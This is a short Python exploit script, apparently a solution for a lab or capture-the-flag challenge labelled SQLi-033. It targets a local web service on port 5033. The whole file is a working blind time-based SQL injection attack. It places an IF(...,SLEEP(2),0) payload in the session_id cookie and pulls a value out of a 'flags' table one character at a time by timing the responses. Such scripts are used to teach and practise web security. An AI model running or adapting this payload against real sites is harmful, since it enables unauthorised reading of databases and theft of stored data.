#!/usr/bin/env python3
"""SQLi-033: MySQL Cookie Time-based Exploit"""
import requests, time, string

def check(cond):
    start = time.time()
    cookie = f"sess_abc123' AND IF({cond},SLEEP(2),0)-- -"
    requests.get("http://localhost:5033/", cookies={"session_id": cookie}, timeout=30)
    return time.time() - start > 1.5

def extract(table, column):
    result = ""
    for pos in range(1, 50):
        for c in string.ascii_letters + string.digits + "_{}":
            if check(f"SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1)='{c}'"):
                result += c
                print(f"[+] {column}: {result}")
                break
        else:
            break
    return result

if __name__ == "__main__":
    print("SQLi-033: MySQL Cookie Time-based Exploit")
    flag = extract("flags", "value")
    print(f"[+] FLAG: {flag}")
